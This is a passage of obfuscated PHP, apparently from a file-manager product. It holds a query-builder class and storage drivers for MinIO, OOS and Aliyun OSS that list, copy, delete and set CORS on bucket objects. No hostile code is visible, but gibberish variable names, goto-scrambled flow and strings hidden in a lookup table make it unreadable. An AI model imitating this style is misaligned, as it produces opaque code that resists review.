$_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (is_array($B÷·ã‹…‰)) { $this->options[$C‘…ˆí®ë[270]] = $B÷·ã‹…‰; } elseif (!empty($B÷·ã‹…‰)) { $this->options[$C‘…ˆí®ë[270]][] = $B÷·ã‹…‰; } return $this; } public function union($Fî˜¡…†ç‹, $E¹¼ÉõÏÄ = false) { goto Bêµ¼›’©Ú; eÂÕÌ×–ª¢: if (is_object($Fî˜¡…†ç‹)) { $Fî˜¡…†ç‹ = get_object_vars($Fî˜¡…†ç‹); } if (is_string($Fî˜¡…†ç‹)) { $c•ÒÑò¢»ê = $Fî˜¡…†ç‹; } elseif (is_array($Fî˜¡…†ç‹)) { if (isset($Fî˜¡…†ç‹[0])) { $this->options[$fëÊ¥ä¯ò[335]] = array_merge($this->options[$fëÊ¥ä¯ò[335]], $Fî˜¡…†ç‹); return $this; } else { $c•ÒÑò¢»ê = $Fî˜¡…†ç‹; } } else { think_exception(think_lang($fëÊ¥ä¯ò[259])); } $this->options[$fëÊ¥ä¯ò[335]][] = $c•ÒÑò¢»ê; goto b¼ÃÎÌ·¬Ú; Bêµ¼›’©Ú: $fëÊ¥ä¯ò =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (empty($Fî˜¡…†ç‹)) { return $this; } if ($E¹¼ÉõÏÄ) { $this->options[$fëÊ¥ä¯ò[335]][$fëÊ¥ä¯ò[336]] = !0; } goto eÂÕÌ×–ª¢; b¼ÃÎÌ·¬Ú: return $this; goto AÌôÇ·Èà®; AÌôÇ·Èà®: } public function cache($BŒäŒÁëù = true, $BÅÂÉöâÂ = null, $B»‘÷ Ïº¼ = '') { $aª¬±¶å† =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!1 !== $BŒäŒÁëù) { $this->options[$aª¬±¶å†[337]] = array($aª¬±¶å†[89] => $BŒäŒÁëù, $aª¬±¶å†[327] => $BÅÂÉöâÂ, $aª¬±¶å†[29] => $B»‘÷ Ïº¼); } return $this; } public function field($A°êÏ¸Ôò£, $FøãµøĞ = false) { $F”†˜†®è‡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!0 === $A°êÏ¸Ôò£) { $däç¥Ğ• = $this->getDbFields(); $A°êÏ¸Ôò£ = $däç¥Ğ• ? $däç¥Ğ• : $F”†˜†®è‡[176]; } elseif ($FøãµøĞ) { if (is_string($A°êÏ¸Ôò£)) { $A°êÏ¸Ôò£ = explode($F”†˜†®è‡[47], $A°êÏ¸Ôò£); } $däç¥Ğ• = $this->getDbFields(); $A°êÏ¸Ôò£ = $däç¥Ğ• ? array_diff($däç¥Ğ•, $A°êÏ¸Ôò£) : $A°êÏ¸Ôò£; } $this->options[$F”†˜†®è‡[261]] = $A°êÏ¸Ôò£; return $this; } public function scope($dÔâ©¹•ùÀ = '', $bë¯ÆÑ¦ã = NULL) { $F”¤¯æñô =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($F”¤¯æñô[33] === $dÔâ©¹•ùÀ) { if (isset($this->_scope[$F”¤¯æñô[34]])) { $BöİœÃ»®¥ = $this->_scope[$F”¤¯æñô[34]]; } else { return $this; } } elseif (is_string($dÔâ©¹•ùÀ)) { $dÄÅğ†Éõ = explode($F”¤¯æñô[47], $dÔâ©¹•ùÀ); $BöİœÃ»®¥ = array(); foreach ($dÄÅğ†Éõ as $C™™á°©¾ñ) { if (!isset($this->_scope[$C™™á°©¾ñ])) { continue; } $BöİœÃ»®¥ = array_merge($BöİœÃ»®¥, $this->_scope[$C™™á°©¾ñ]); } if (!empty($bë¯ÆÑ¦ã) && is_array($bë¯ÆÑ¦ã)) { $BöİœÃ»®¥ = array_merge($BöİœÃ»®¥, $bë¯ÆÑ¦ã); } } elseif (is_array($dÔâ©¹•ùÀ)) { $BöİœÃ»®¥ = $dÔâ©¹•ùÀ; } if (is_array($BöİœÃ»®¥) && !empty($BöİœÃ»®¥)) { $this->options = array_merge($this->options, array_change_key_case($BöİœÃ»®¥)); } return $this; } public function where($Cö¦§ß©×¼, $EíøÓŒÈŠÌ = null) { $dˆ¸­ôŠí’ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!is_null($EíøÓŒÈŠÌ) && is_string($Cö¦§ß©×¼)) { if (!is_array($EíøÓŒÈŠÌ)) { $EíøÓŒÈŠÌ = func_get_args(); array_shift($EíøÓŒÈŠÌ); } $EíøÓŒÈŠÌ = array_map(array($this->db, $dˆ¸­ôŠí’[331]), $EíøÓŒÈŠÌ); $Cö¦§ß©×¼ = vsprintf($Cö¦§ß©×¼, $EíøÓŒÈŠÌ); } elseif (is_object($Cö¦§ß©×¼)) { $Cö¦§ß©×¼ = get_object_vars($Cö¦§ß©×¼); } elseif (is_array($Cö¦§ß©×¼)) { foreach ($Cö¦§ß©×¼ as $F¼ìÏ—çô => $eİ‘Ï”‘İö) { if ((is_numeric($F¼ìÏ—çô) || !$F¼ìÏ—çô) && is_string($eİ‘Ï”‘İö)) { think_trace($dˆ¸­ôŠí’[338], $dˆ¸­ôŠí’[33], $dˆ¸­ôŠí’[46]); die; } } } if (is_string($Cö¦§ß©×¼) && $dˆ¸­ôŠí’[33] != $Cö¦§ß©×¼) { $fÊÚ‹¼ğØó = array(); $fÊÚ‹¼ğØó[$dˆ¸­ôŠí’[339]] = $Cö¦§ß©×¼; $Cö¦§ß©×¼ = $fÊÚ‹¼ğØó; } if (isset($this->options[$dˆ¸­ôŠí’[263]])) { $this->options[$dˆ¸­ôŠí’[263]] = array_merge($this->options[$dˆ¸­ôŠí’[263]], $Cö¦§ß©×¼); } else { $this->options[$dˆ¸­ôŠí’[263]] = $Cö¦§ß©×¼; } return $this; } public function limit($D‰Öç±‰“ñ, $fÅ¨‘ƒ†‰ = null) { $dÛ¯ì‚Şğ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->options[$dÛ¯ì‚Şğ[280]] = is_null($fÅ¨‘ƒ†‰) ? $D‰Öç±‰“ñ : $D‰Öç±‰“ñ . $dÛ¯ì‚Şğ[47] . $fÅ¨‘ƒ†‰; return $this; } public function page($bñè‚“ÂÚ, $C˜”‚óÖ²ç = null) { $dººÈ‹Äºà =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->options[$dººÈ‹Äºà[340]] = is_null($C˜”‚óÖ²ç) ? $bñè‚“ÂÚ : $bñè‚“ÂÚ . $dººÈ‹Äºà[47] . $C˜”‚óÖ²ç; return $this; } public function comment($e‚Ë¡¼æŒŠ) { $this->options[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][341]] = $e‚Ë¡¼æŒŠ; return $this; } public function setProperty($b—ó÷‰÷õ¿, $f÷Ôó•ŒÒ) { if (property_exists($this, $b—ó÷‰÷õ¿)) { $this->{$b—ó÷‰÷õ¿} = $f÷Ôó•ŒÒ; } return $this; } } goto BâˆÀã¨šì; f¤¯á´—Ñ»: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($EÁ¦ŞÌ À) { parent::__construct($EÁ¦ŞÌ À); $this->signatureVersion($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][200]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($BğØÍÒÛàã) { parent::__construct($BğØÍÒÛàã); $this->signatureVersion($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][200]); } public function fileOutLink($c½Š­¶…‡) { $fé¬¤Äµİ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (substr($c½Š­¶…‡, 0, 7) == $fé¬¤Äµİ[1112]) { $c½Š­¶…‡ = $fé¬¤Äµİ[1113] . substr($c½Š­¶…‡, 7); } header($fé¬¤Äµİ[156] . $c½Š­¶…‡); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($dÜîÁ•¼ˆ ) { parent::__construct(); include_once SDK_DIR . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1170]; $this->_init($dÜîÁ•¼ˆ ); } public function _init($b©ªÑ¤é¬É) { foreach ($b©ªÑ¤é¬É as $b„Ù¿Œ³« => $câç¯ŸÁ×¦) { if (isset($this->{$b„Ù¿Œ³«})) { $this->{$b„Ù¿Œ³«} = $câç¯ŸÁ×¦; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1171], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto Eé¶¯œ‰¯­; A¦”Âà¡É»: $Fã¾†‡ê›¾->addAllowedOrigin($a°ÂÚØ[1172]); $Fã¾†‡ê›¾->addAllowedMethod($a°ÂÚØ[1173]); $Fã¾†‡ê›¾->addAllowedMethod($a°ÂÚØ[1174]); goto BÕÓ²°¼Ñ®; bèÛ‚—²¢°: $a±˜ñêäŒ†->addRule($Fã¾†‡ê›¾); try { $this->client->putBucketCors($this->bucket, $a±˜ñêäŒ†); } catch (OSS\Core\OssException $BîÑÌ‹’±) { return !1; } return !0; goto A˜»ô‘ °; D¼›Úù©Ë‘: $Fã¾†‡ê›¾->setMaxAgeSeconds(600); $Fã¾†‡ê›¾->addExposeHeader($a°ÂÚØ[1177]); $Fã¾†‡ê›¾->addAllowedHeader($a°ÂÚØ[1172]); goto bèÛ‚—²¢°; Eé¶¯œ‰¯­: $a°ÂÚØ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a±˜ñêäŒ† = new OSS\Model\CorsConfig(); $Fã¾†‡ê›¾ = new OSS\Model\CorsRule(); goto A¦”Âà¡É»; BÕÓ²°¼Ñ®: $Fã¾†‡ê›¾->addAllowedMethod($a°ÂÚØ[1175]); $Fã¾†‡ê›¾->addAllowedMethod($a°ÂÚØ[1176]); $Fã¾†‡ê›¾->addAllowedMethod($a°ÂÚØ[155]); goto D¼›Úù©Ë‘; A˜»ô‘ °: } public function getBucketCors() { goto cĞÇ—µñ¾Õ; CÛïªš“Ş: $b‡°â´ÙßÁ = $B†ùÖ¦ªòº[0]->getMaxAgeSeconds(); $F±ÎÔ³ïÊ = $B†ùÖ¦ªòº[0]->getExposeHeaders(); $c°îªª”ğ = $B†ùÖ¦ªòº[0]->getAllowedHeaders(); goto DŠİ½°’Áñ; cĞÇ—µñ¾Õ: $bí•ùš•ç =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a½—§©ëãœ = null; try { $a½—§©ëãœ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Dğìñ´„“±) { return null; } goto Dª‡ÍÈ÷š; Dª‡ÍÈ÷š: if (!$a½—§©ëãœ || !($B†ùÖ¦ªòº = $a½—§©ëãœ->getRules())) { return null; } $bÙµáèÕ¹¿ = $B†ùÖ¦ªòº[0]->getAllowedOrigins(); $Dó§·³¿° = $B†ùÖ¦ªòº[0]->getAllowedMethods(); goto CÛïªš“Ş; DŠİ½°’Áñ: return array($bí•ùš•ç[175] => isset($bÙµáèÕ¹¿[0]) ? $bÙµáèÕ¹¿[0] : $bí•ùš•ç[33], $bí•ùš•ç[179] => $Dó§·³¿°, $bí•ùš•ç[1178] => $b‡°â´ÙßÁ, $bí•ùš•ç[1179] => isset($F±ÎÔ³ïÊ[0]) ? $F±ÎÔ³ïÊ[0] : $bí•ùš•ç[33], $bí•ùš•ç[177] => isset($c°îªª”ğ[0]) ? $c°îªª”ğ[0] : $bí•ùš•ç[33]); goto D‡†Ôã ‘İ; D‡†Ôã ‘İ: } public function isBucketCors() { goto AŒ‡†Á½ÀÎ; AŒ‡†Á½ÀÎ: $BÊï…¬”îÏ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d¾ãÑ«®à¾ = $this->getBucketCors(); if (!$d¾ãÑ«®à¾ || !is_array($d¾ãÑ«®à¾)) { return !1; } goto c›È‚ˆŸŠ±; c›È‚ˆŸŠ±: if ($d¾ãÑ«®à¾[$BÊï…¬”îÏ[175]] != $BÊï…¬”îÏ[176] || $d¾ãÑ«®à¾[$BÊï…¬”îÏ[177]] != $BÊï…¬”îÏ[176]) { return !1; } $fœĞ³ë»Š– = array_map($BÊï…¬”îÏ[178], $d¾ãÑ«®à¾[$BÊï…¬”îÏ[179]]); if (!is_array($fœĞ³ë»Š–)) { $fœĞ³ë»Š– = array(); } goto FÉ¹¡‹íº; FÉ¹¡‹íº: $dòåÎ‡•° = array($BÊï…¬”îÏ[180], $BÊï…¬”îÏ[181], $BÊï…¬”îÏ[182], $BÊï…¬”îÏ[183], $BÊï…¬”îÏ[184]); $A£ç—¢ äË = array_diff($dòåÎ‡•°, $fœĞ³ë»Š–); return empty($A£ç—¢ äË); goto C‰”œ‹; C‰”œ‹: } public function mkfile($EÇ‰–›Äğ•, $Fñš¶¸Ãéº = '', $a­òæîºº« = REPEAT_RENAME) { $EÎĞ˜ëÙº = $this->setContent($EÇ‰–›Äğ•, $Fñš¶¸Ãéº); if ($EÎĞ˜ëÙº !== !1) { return $this->getPathOuter($EÇ‰–›Äğ•); } return !1; } public function mkdir($aî¡çÜ¢¡Ï, $a×Ë¬ôÏàĞ = REPEAT_SKIP) { if ($this->_isFolder($aî¡çÜ¢¡Ï)) { return $this->getPathOuter($aî¡çÜ¢¡Ï); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($aî¡çÜ¢¡Ï)); } catch (OSS\Core\OssException $côâˆ½½¯) { return !1; } return $this->getPathOuter($aî¡çÜ¢¡Ï); } private function fileList($AëÛ°¬ßªŒ, $b¾ŠŒ‡¶È = '', $e¦•¶—×âï = 0) { goto aáÇÛöƒ¹‰; b¤˜³µ¥ŠÖ: while (!0) { $BêäÅ¢ß‘ = array($a¡ÕŒİƒÅˆ[1180] => $b¾ŠŒ‡¶È, $a¡ÕŒİƒÅˆ[186] => $F¤“¿­ø®µ, $a¡ÕŒİƒÅˆ[1181] => $aÙ¹—×¢‰Î, $a¡ÕŒİƒÅˆ[1182] => $FàÌÀ‰‡íò); try { $dÊ©ã’Ëä‚ = $this->client->listObjects($this->bucket, $BêäÅ¢ß‘); } catch (OSS\Core\OssException $CŒˆºïÄÖƒ) { break; } $FàÌÀ‰‡íò = $dÊ©ã’Ëä‚->getNextMarker(); $aÇâêğÁ = $dÊ©ã’Ëä‚->getObjectList(); $eæÍ´¬šå = $dÊ©ã’Ëä‚->getPrefixList(); foreach ($aÇâêğÁ as $aÔÉƒ÷Î²Ù) { if ($aÔÉƒ÷Î²Ù->getKey() == $F¤“¿­ø®µ) { continue; } $b˜àœˆé‚¿ = $aÔÉƒ÷Î²Ù->getKey(); if ($e¦•¶—×âï) { $b˜àœˆé‚¿ = array($a¡ÕŒİƒÅˆ[28] => $b˜àœˆé‚¿, $a¡ÕŒİƒÅˆ[77] => $aÔÉƒ÷Î²Ù->getSize(), $a¡ÕŒİƒÅˆ[190] => strtotime($aÔÉƒ÷Î²Ù->getLastModified())); } $bİìä¨é‘Î[] = $b˜àœˆé‚¿; } foreach ($eæÍ´¬šå as $d³§÷»Ô£æ) { $b¬™ƒùœÌ[] = $d³§÷»Ô£æ->getPrefix(); } if ($FàÌÀ‰‡íò === $a¡ÕŒİƒÅˆ[33]) { break; } } return array($a¡ÕŒİƒÅˆ[74] => $b¬™ƒùœÌ, $a¡ÕŒİƒÅˆ[73] => $bİìä¨é‘Î); goto c¹¶†’¬À‚; BïŠæ×ÜÅ: $FàÌÀ‰‡íò = $a¡ÕŒİƒÅˆ[33]; $aÙ¹—×¢‰Î = 1000; $b¬™ƒùœÌ = $bİìä¨é‘Î = array(); goto b¤˜³µ¥ŠÖ; aáÇÛöƒ¹‰: $a¡ÕŒİƒÅˆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $AëÛ°¬ßªŒ = trim($AëÛ°¬ßªŒ, $a¡ÕŒİƒÅˆ[8]); $F¤“¿­ø®µ = empty($AëÛ°¬ßªŒ) ? $a¡ÕŒİƒÅˆ[33] : $AëÛ°¬ßªŒ . $a¡ÕŒİƒÅˆ[8]; goto BïŠæ×ÜÅ; c¹¶†’¬À‚: } public function copyFile($dõŸ‹‡ï£, $Cù·Ï‰ÖîŒ) { $C¼–’Ç£Ÿ = $this->size($dõŸ‹‡ï£); if ($C¼–’Ç£Ÿ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $dõŸ‹‡ï£, $this->bucket, $this->pathEncode($Cù·Ï‰ÖîŒ)); } catch (OSS\Core\OssException $bÏˆÕê¼Ÿ) { return !1; } return $this->getPathOuter($Cù·Ï‰ÖîŒ); } $cãİ§•ö‚í = $this->multiCopyObject($dõŸ‹‡ï£, $Cù·Ï‰ÖîŒ, $C¼–’Ç£Ÿ); return $cãİ§•ö‚í ? $this->getPathOuter($Cù·Ï‰ÖîŒ) : !1; } private function multiCopyObject($b–ì‚Ì¥ÍÓ, $a­Çà‹”âÙ, $bÃï³Ú÷ˆ×) { $A¡ŠÄ×Ï” =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; try { goto f™›ó‘Üßã; dÑ¥³’äø…: $E‰°„“ì‡È = array(); foreach ($dáÚçä¬ã¥ as $fî„ËñÜ¬Á => $c´ÉÏÌÅˆâ) { $E‰°„“ì‡È[] = array($A¡ŠÄ×Ï”[1187] => $fî„ËñÜ¬Á + 1, $A¡ŠÄ×Ï”[1188] => $c´ÉÏÌÅˆâ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($a­Çà‹”âÙ), $dâ‰Âª¡È, $E‰°„“ì‡È); goto bÏö¶ÙØ•¶; Dª§ä¹«Î£: $E¶–„§éõ‹ = 1024 * 1024 * 10; $Bƒ¨ó§Æ¤ù = $this->client->generateMultiuploadParts($bÃï³Ú÷ˆ×, $E¶–„§éõ‹); foreach ($Bƒ¨ó§Æ¤ù as $fî„ËñÜ¬Á => $F§œçñš†‚) { $AŠ”ÅœßÎî = $cÁ™ÂßŞÈ· + (int) $F§œçñš†‚[$A¡ŠÄ×Ï”[1184]]; $e­¸ÃÉÕ¶˜ = (int) $F§œçñš†‚[$A¡ŠÄ×Ï”[325]] + $AŠ”ÅœßÎî - 1; $EÅ­ ÄÉŞ’ = array($A¡ŠÄ×Ï”[1185] => $AŠ”ÅœßÎî, $A¡ŠÄ×Ï”[1186] => $e­¸ÃÉÕ¶˜); $dáÚçä¬ã¥[] = $this->client->uploadPartCopy($this->bucket, $b–ì‚Ì¥ÍÓ, $this->bucket, $this->pathEncode($a­Çà‹”âÙ), $eæ·„Ñ¿‰, $dâ‰Âª¡È, $EÅ­ ÄÉŞ’); $eæ·„Ñ¿‰ = $eæ·„Ñ¿‰ + 1; } goto dÑ¥³’äø…; f™›ó‘Üßã: $e«ÛÇ‰£Àù = array(); if ($c·˜¥ËÅ’¬ = $this->hashMd5($b–ì‚Ì¥ÍÓ)) { $e«ÛÇ‰£Àù = array(OSS\OssClient::OSS_HEADERS => array($A¡ŠÄ×Ï”[1183] => $c·˜¥ËÅ’¬)); } $dâ‰Âª¡È = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($a­Çà‹”âÙ), $e«ÛÇ‰£Àù); goto CˆîÕ×ÍëŒ; CˆîÕ×ÍëŒ: $eæ·„Ñ¿‰ = 1; $cÁ™ÂßŞÈ· = 0; $dáÚçä¬ã¥ = array(); goto Dª§ä¹«Î£; bÏö¶ÙØ•¶: } catch (OSS\Core\OssException $Dó¾ÄáØµ) { return !1; } return !0; } public function moveFile($c½È¬ÑŠ‹, $bé£ÍÊÖ¸ç) { if ($this->copyFile($c½È¬ÑŠ‹, $bé£ÍÊÖ¸ç)) { $this->remove($c½È¬ÑŠ‹); return $this->getPathOuter($bé£ÍÊÖ¸ç); } return !1; } public function delFile($B”·¡²ÀÂ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($B”·¡²ÀÂ)); } catch (OSS\Core\OssException $fŒ‰óâÓ‹¡) { return !1; } return !0; } public function delFolder($b‹„©˜Õ”‘) { $D•ÂŒï£ÇÑ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $AõíŠõò³Ö = $this->fileList($b‹„©˜Õ”‘); if (!empty($b‹„©˜Õ”‘) && !in_array(trim($b‹„©˜Õ”‘, $D•ÂŒï£ÇÑ[8]) . $D•ÂŒï£ÇÑ[8], $AõíŠõò³Ö[$D•ÂŒï£ÇÑ[73]])) { $AõíŠõò³Ö[$D•ÂŒï£ÇÑ[73]][] = trim($b‹„©˜Õ”‘, $D•ÂŒï£ÇÑ[8]) . $D•ÂŒï£ÇÑ[8]; } foreach (array_chunk($AõíŠõò³Ö[$D•ÂŒï£ÇÑ[73]], 1000) as $AšåÌÍ) { try { $this->client->deleteObjects($this->bucket, $AšåÌÍ); } catch (OSS\Core\OssException $D¢‚ô×©Ó¦) { continue; } } return !0; } public function rename($d¿Ğ˜÷, $Bè¶ÚÆñù) { return $this->renameObject($d¿Ğ˜÷, $Bè¶ÚÆñù); } private function fileInfo($cŠ¶‚ÜÚÔò, $d†‚—È¢‹™ = array()) { goto cÁ†Üªõâò; b÷¶°¨İÄ®: if (isset($d†‚—È¢‹™[$Eâ‘Õõğ¢[77]])) { $F’ÈÆ’×åê[$Eâ‘Õõğ¢[77]] = $d†‚—È¢‹™[$Eâ‘Õõğ¢[77]]; } if (isset($d†‚—È¢‹™[$Eâ‘Õõğ¢[107]])) { $F’ÈÆ’×åê[$Eâ‘Õõğ¢[107]] = $d†‚—È¢‹™[$Eâ‘Õõğ¢[107]]; } if (isset($d†‚—È¢‹™[$Eâ‘Õõğ¢[190]]) && !trim($F’ÈÆ’×åê[$Eâ‘Õõğ¢[107]])) { $F’ÈÆ’×åê[$Eâ‘Õõğ¢[107]] = $d†‚—È¢‹™[$Eâ‘Õõğ¢[190]]; } goto A‹¿‹‰¶¾Ş; cÁ†Üªõâò: $Eâ‘Õõğ¢ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $F’ÈÆ’×åê = array($Eâ‘Õõğ¢[28] => $this->pathThis($cŠ¶‚ÜÚÔò), $Eâ‘Õõğ¢[75] => $this->getPathOuter($cŠ¶‚ÜÚÔò), $Eâ‘Õõğ¢[29] => $Eâ‘Õõğ¢[167], $Eâ‘Õõğ¢[187] => 0, $Eâ‘Õõğ¢[107] => 0, $Eâ‘Õõğ¢[77] => 0, $Eâ‘Õõğ¢[160] => $this->ext($cŠ¶‚ÜÚÔò), $Eâ‘Õõğ¢[188] => !0, $Eâ‘Õõğ¢[189] => !0); if (empty($d†‚—È¢‹™)) { $dÓŞàÙò©¶ = $this->objectMeta($cŠ¶‚ÜÚÔò); if (!$dÓŞàÙò©¶) { return $F’ÈÆ’×åê; } $d†‚—È¢‹™ = array($Eâ‘Õõğ¢[107] => strtotime($dÓŞàÙò©¶[$Eâ‘Õõğ¢[1189]]), $Eâ‘Õõğ¢[77] => $dÓŞàÙò©¶[$Eâ‘Õõğ¢[1190]] + 0); } goto b÷¶°¨İÄ®; A‹¿‹‰¶¾Ş: return $F’ÈÆ’×åê; goto a·£¦¡ñ»°; a·£¦¡ñ»°: } private function folderInfo($a¸Œİ“ğï˜, $bçééŒ‰ñ• = array()) { $C±Ç§İ„Úƒ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EĞ²æõĞ¶× = array($C±Ç§İ„Úƒ[28] => $this->pathThis($a¸Œİ“ğï˜), $C±Ç§İ„Úƒ[75] => $this->getPathOuter($C±Ç§İ„Úƒ[8] . $a¸Œİ“ğï˜), $C±Ç§İ„Úƒ[29] => $C±Ç§İ„Úƒ[76], $C±Ç§İ„Úƒ[187] => 0, $C±Ç§İ„Úƒ[107] => 0, $C±Ç§İ„Úƒ[188] => !0, $C±Ç§İ„Úƒ[189] => !0); if (empty($bçééŒ‰ñ•)) { $a¸Œİ“ğï˜ = rtrim($a¸Œİ“ğï˜, $C±Ç§İ„Úƒ[8]) . $C±Ç§İ„Úƒ[8]; $AÃ°Æç‚ó = $this->objectMeta($a¸Œİ“ğï˜); if (!$AÃ°Æç‚ó) { return $EĞ²æõĞ¶×; } $bçééŒ‰ñ• = array($C±Ç§İ„Úƒ[187] => $AÃ°Æç‚ó[$C±Ç§İ„Úƒ[1191]][$C±Ç§İ„Úƒ[1192]], $C±Ç§İ„Úƒ[107] => strtotime($AÃ°Æç‚ó[$C±Ç§İ„Úƒ[1189]])); } if (isset($bçééŒ‰ñ•[$C±Ç§İ„Úƒ[107]])) { $EĞ²æõĞ¶×[$C±Ç§İ„Úƒ[107]] = $bçééŒ‰ñ•[$C±Ç§İ„Úƒ[107]]; } if (isset($bçééŒ‰ñ•[$C±Ç§İ„Úƒ[187]])) { $EĞ²æõĞ¶×[$C±Ç§İ„Úƒ[187]] = $bçééŒ‰ñ•[$C±Ç§İ„Úƒ[187]]; } return $EĞ²æõĞ¶×; } public function listPath($A³©‹ƒ¡ÌÕ, $B¥†©Ìù¬í = false) { $d²ôô•µÄ» =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c­–¤Ûè‡¨ = $this->fileList($A³©‹ƒ¡ÌÕ, $d²ôô•µÄ»[8], !0); foreach ($c­–¤Ûè‡¨[$d²ôô•µÄ»[74]] as $f™‰À¤šµ => $cö“Ğ‡ñÑâ) { $c­–¤Ûè‡¨[$d²ôô•µÄ»[74]][$f™‰À¤šµ] = $this->folderInfo($cö“Ğ‡ñÑâ, $cö“Ğ‡ñÑâ); } foreach ($c­–¤Ûè‡¨[$d²ôô•µÄ»[73]] as $f™‰À¤šµ => $cö“Ğ‡ñÑâ) { $c­–¤Ûè‡¨[$d²ôô•µÄ»[73]][$f™‰À¤šµ] = $this->fileInfo($cö“Ğ‡ñÑâ[$d²ôô•µÄ»[28]], $cö“Ğ‡ñÑâ); } return $c­–¤Ûè‡¨; } public function has($c§³ƒî±–, $BòÎÊŸÁê = false, $E‡È¦ß¢Çâ = true) { goto c±»»òçº; B·›“ÁµÍì: return !1; goto B‹Ä™×°‹; C†ã„ÍÍÆŞ: $aËÒÓÇ»õ = 0; while (!0) { $aÇ‡ªÚİŒì = array($CØŠÎÃ•[1180] => $CØŠÎÃ•[8], $CØŠÎÃ•[186] => $C´“ÒÊ½¨Á, $CØŠÎÃ•[1181] => $E›£ŸÇ»öœ, $CØŠÎÃ•[1182] => $BİÛ ™‚Ê); try { $EãïØ¥õíí = $this->client->listObjects($this->bucket, $aÇ‡ªÚİŒì); } catch (OSS\Core\OssException $aè•ËƒºÔ®) { break; } $BİÛ ™‚Ê = $EãïØ¥õíí->getNextMarker(); $aöÎÆõ‘²§ = $EãïØ¥õíí->getObjectList(); $Cñùí‹Šß = $EãïØ¥õíí->getPrefixList(); if ($BòÎÊŸÁê) { if (count($aöÎÆõ‘²§) > 1 || count($aöÎÆõ‘²§) == 1 && $aöÎÆõ‘²§[0]->getKey() != $C´“ÒÊ½¨Á) { $d õ—³‚¯ += count($aöÎÆõ‘²§) - 1; } if (!empty($Cñùí‹Šß)) { $aËÒÓÇ»õ += count($Cñùí‹Šß); } if ($BİÛ ™‚Ê === $CØŠÎÃ•[33]) { break; } continue; } if ($E‡È¦ß¢Çâ) { if (!empty($aöÎÆõ‘²§)) { if (count($aöÎÆõ‘²§) > 1 || $aöÎÆõ‘²§[0]->getKey() != $C´“ÒÊ½¨Á) { return !0; } } } else { if (!empty($Cñùí‹Šß)) { return !0; } } if ($BİÛ ™‚Ê === $CØŠÎÃ•[33]) { break; } } if ($BòÎÊŸÁê) { return array($CØŠÎÃ•[191] => $d õ—³‚¯, $CØŠÎÃ•[192] => $aËÒÓÇ»õ); } goto B·›“ÁµÍì; c±»»òçº: $CØŠÎÃ• =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c§³ƒî±– = trim($c§³ƒî±–, $CØŠÎÃ•[8]); $C´“ÒÊ½¨Á = empty($c§³ƒî±–) ? $CØŠÎÃ•[33] : $c§³ƒî±– . $CØŠÎÃ•[8]; goto a£ŠÀ®ÂÌß; a£ŠÀ®ÂÌß: $BİÛ ™‚Ê = $CØŠÎÃ•[33]; $E›£ŸÇ»öœ = 500; $d õ—³‚¯ = 0; goto C†ã„ÍÍÆŞ; B‹Ä™×°‹: } public function listAll($EÉœâá¢‡) { $Aáàêğåïˆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f“ÀîŞÄº = $this->fileList($EÉœâá¢‡, $Aáàêğåïˆ[33], !0); $BäŸî™‹” = array(); foreach ($f“ÀîŞÄº[$Aáàêğåïˆ[73]] as $CÜ¬¢ëƒŠ”) { $BäŸî™‹”[$CÜ¬¢ëƒŠ”[$Aáàêğåïˆ[28]]] = $CÜ¬¢ëƒŠ”[$Aáàêğåïˆ[77]]; } return $this->listAllFiles($EÉœâá¢‡, array_keys($BäŸî™‹”), $BäŸî™‹”); } public function canRead($Dî®³Ğæí) { $F ¥Ñ™ç³À =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e•àº„— = $this->pathAcl($Dî®³Ğæí); return $e•àº„— == $F ¥Ñ™ç³À[1193] || $e•àº„— == $F ¥Ñ™ç³À[493] ? !0 : !1; } public function canWrite($f†´ø©¢¨Æ) { $D™†Ê”×¤Ÿ = $this->pathAcl($f†´ø©¢¨Æ); return $D™†Ê”×¤Ÿ == $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][493] ? !0 : !1; } public function pathAcl($FªË¸ÏÙ–) { goto aáİöãé–; b–ŠæÍéÌ·: $D‡¥‚İŞ  = 